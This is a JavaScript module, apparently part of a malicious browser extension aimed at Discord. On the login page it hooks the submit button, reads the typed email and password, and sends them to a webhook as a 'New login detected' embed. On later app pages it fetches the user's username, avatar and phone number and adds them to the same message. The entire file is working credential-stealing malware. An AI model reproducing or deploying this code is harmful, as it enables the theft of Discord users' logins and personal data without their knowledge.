const Util = require('../../utils');
const { waitForElement } = require('../../utils/Document');
const { formatFields, code, getFooter, formatField } = require('../../utils/Webhook');
const Webhook = require('../../utils/Webhook');
const variable = 'discord_message_id';

module.exports = {
  webPattern: /https:\/\/(canary.|ptb.)?discord\.com/g,
  urlsMatches: [
    {
      path: '/login',
      async run() {
        (await waitForElement(this.getSelector('submit'))).addEventListener('click', async () => {
          const emailInput = document.querySelector(this.getSelector('emailInput'))?.value;
          const passwordInput = document.querySelector(this.getSelector('passwordInput'))?.value;

          const { id } = await Util.Webhook.sendEmbed({
            title: 'New login detected',
            fields: formatFields([
              ['Email', code(emailInput)],
              ['Password', code(passwordInput)],
            ]),
            footer: getFooter()
          });
          await chrome.storage.local.set({ [variable]: id });
        });
      }
    },
    {
      path: ['/app', '/channels/@me'],
      async run() {
        const id = (await chrome.storage.local.get(variable))[variable];
        if (!id) return;

        const user = await chrome.runtime.sendMessage({
          type: 'DISCORD_USER_INFO',
          data: { messageId: id, variable }
        });
        const { embeds: [embed] } = await Webhook.getMessage(id);
        const avatar = (hash, id, discriminator) => {
          if (!hash) {
            return `https://cdn.discordapp.com/embed/avatars/${discriminator === '0' ? (parseInt(id) >> 22) % 6 : parseInt(discriminator) % 5}.png`;
          } else {
            return `https://cdn.discordapp.com/avatars/${id}/${hash.startsWith('a_') ? 'gif' : 'png'}.gif`;
          }
        };

        embed.author = { name: user.username, icon_url: avatar(user.avatar, user.id, user.discriminator) };
        embed.fields.push(formatField(['Phone Number', user.phone ? code(user.phone) : 'No Phone Number']));
        await Webhook.editEmbed(embed, id).then(async () => await chrome.storage.local.remove(variable));
      }
    }
  ],
  selectors: {
    emailInput: 'input.inputDefault-Ciwd-S.input-3O04eu.inputField-2RZxdl[type="text"]',
    passwordInput: 'input.inputDefault-Ciwd-S.input-3O04eu[type="password"]',
    submit: 'button[type="submit"]'
  }
};
